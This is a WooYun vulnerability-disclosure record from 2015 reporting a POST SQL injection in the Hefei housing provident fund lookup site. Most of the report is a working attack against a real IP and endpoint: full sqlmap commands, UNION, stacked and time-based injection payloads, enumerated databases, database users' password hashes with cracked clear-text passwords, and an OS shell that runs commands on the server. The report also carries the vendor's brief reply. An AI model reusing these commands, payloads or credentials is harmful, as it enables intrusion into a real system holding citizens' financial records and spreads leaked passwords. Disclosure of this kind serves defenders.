{"id": 6290, "wybug_id": "wooyun-2015-0122888", "wybug_title": "合肥市住房公积金查询系统存在post注入（可系统交互shell/影响公积金用户）", "wybug_corp": "合肥公积金", "wybug_author": "路人甲", "wybug_date": "2015-06-26 14:06", "wybug_open_date": "2015-08-14 10:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向公众公开  简要描述： 看下面 详细说明：  漏洞利用：sqlmap -u \"http://220.178.98.86/hfgjj/jsp/web/public/search/getPw.jsp\" --data \"xm=88952634&sjhm=88952634&zgyhzh=88952634\"---Parameter: sjhm (POST)    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: xm=88952634&sjhm=88952634' UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(107)+CHAR(112)+CHAR(98)+CHAR(113)+CHAR(86)+CHAR(75)+CHAR(118)+CHAR(65)+CHAR(103)+CHAR(117)+CHAR(74)+CHAR(84)+CHAR(112)+CHAR(82)+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(107)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL-- &zgyhzh=88952634    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: xm=88952634&sjhm=88952634'; WAITFOR DELAY '0:0:5'--&zgyhzh=88952634    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: xm=88952634&sjhm=88952634' WAITFOR DELAY '0:0:5'--&zgyhzh=88952634---[11:50:37] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: Apache 2.2.22, JSPback-end DBMS: Microsoft SQL Server 2000[11:50:37] [INFO] fetched data logged to text files under '/root/.sqlmap/output/220.178.98.86'available databases [7]:                                                       [*] gjj[*] hengke[*] hfgjj[*] master[*] model[*] msdb[*] tempdb[11:57:16] [INFO] fetched data logged to text files under '/root/.sqlmap/output/220.178.98.86'database management system users [4]:                                          [*] 12329[*] BUILTIN\\\\Administrators[*] hengke[*] sa[11:57:51] [INFO] fetched data logged to text files under '/root/.sqlmap/output/220.178.98.86'database management system users password hashes:[*] 12329 [1]:    password hash: 0x0100f07081700cfaf759e66438ea2f3ba8716645d9e13d8ddb7e0cfaf759e66438ea2f3ba8716645d9e13d8ddb7e        header: 0x0100        salt: f0708170        mixedcase: 0cfaf759e66438ea2f3ba8716645d9e13d8ddb7e        uppercase: 0cfaf759e66438ea2f3ba8716645d9e13d8ddb7e    clear-text password: 12329[*] BUILTIN\\\\Administrators [1]:    password hash: NULL[*] hengke [1]:    password hash: 0x0100db4afb45cf379dd1faabfd592a4b6c83d0b56e1c1d599309ba0ec5c2775dace3924d902c8041900c6b0df944        header: 0x0100        salt: db4afb45        mixedcase: cf379dd1faabfd592a4b6c83d0b56e1c1d599309        uppercase: ba0ec5c2775dace3924d902c8041900c6b0df944    clear-text password: hengke[*] sa [1]:    password hash: 0x0100d341535b397ce619be87c4a2592e80b579c006713a72aacc606f04f250d80f97cd3d5f7c97fcaad96fba05ae        header: 0x0100        salt: d341535b        mixedcase: 397ce619be87c4a2592e80b579c006713a72aacc        uppercase: 606f04f250d80f97cd3d5f7c97fcaad96fba05ae    clear-text password: sa[11:58:21] [INFO] fetched data logged to text files under '/root/.sqlmap/output/220.178.98.86'系统交互shell：sqlmap -u \"http://220.178.98.86/hfgjj/jsp/web/public/search/getPw.jsp\" --data \"xm=88952634&sjhm=88952634&zgyhzh=88952634\" --os-shell   可执行cmd命令os-shell> ipconfigdo you want to retrieve the command standard output? [Y/n/a] y[11:52:40] [INFO] the SQL query used returns 12 entries[11:52:43] [INFO] retrieved: 14                                                [11:52:57] [INFO] retrieved:  [11:53:18] [INFO] retrieved: Wi[11:54:43] [ERROR] invalid character detected. retrying..[11:54:43] [WARNING] increasing time delay to 6 secondsn[11:56:00] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the requestdo[11:57:03] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the requestws 20   漏洞证明：  看上面   修复方案：  开发去哪儿了   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-06-30 10:11 厂商回复： CNVD未直接复现所述情况，按照漏洞报送者所述情况整理通报，转由CNCERT下发给安徽分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}